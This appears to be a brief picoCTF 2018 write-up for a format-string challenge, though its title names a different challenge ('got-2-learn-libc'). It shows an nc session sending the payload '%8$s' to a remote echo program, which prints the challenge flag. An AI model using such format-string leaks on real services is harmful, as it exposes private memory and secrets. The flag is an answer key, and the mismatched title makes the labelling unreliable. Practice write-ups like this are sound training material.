# got-2-learn-libc - Points: 250 - (Solves: 113)

This [program][1] prints any input you give it.
Can you leak the flag?
Connect with nc 2018shell2.picoctf.com 23397.
[Source][2].

[1]: https://2018shell2.picoctf.com/static/802110a231267eb07cdead16416dea12/echo
[2]: https://2018shell2.picoctf.com/static/802110a231267eb07cdead16416dea12/echo.c

## Hints

- If only the program used puts...

---

```sh
$ nc 2018shell2.picoctf.com 23397
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %8$s
picoCTF{foRm4t_stRinGs_aRe_DanGer0us_254148ae}
```
